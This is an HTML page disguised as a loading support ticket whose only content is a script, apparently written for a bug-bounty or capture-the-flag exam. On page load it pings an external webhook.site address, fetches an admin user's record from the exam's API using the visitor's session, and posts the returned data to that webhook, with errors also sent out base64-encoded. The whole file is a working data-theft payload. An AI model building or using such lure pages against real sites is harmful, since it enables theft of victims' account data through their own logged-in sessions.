<!DOCTYPE html>
<html>
<head>
    <title>Support Ticket Loading...</title>
</head>
<body>
    <script>
        // Signal to your webhook that the script started
        fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/SCRIPT_STARTED');

        async function getTheFlag() {
            try {
                // 1. Try to fetch the admin's own data 
                // Using the Admin ID you found earlier
                const response = await fetch('https://api-bugbounty-exam.hashacademy.co/api/users/69d28e841cda77b519a9550e');
                const data = await response.json();
                
                // 2. Send the result to your webhook
                fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
            } catch (err) {
                // If it fails, send the error message
                fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/ERROR?msg=' + btoa(err.message));
            }
        }
        getTheFlag();
    </script>
</body>
</html>
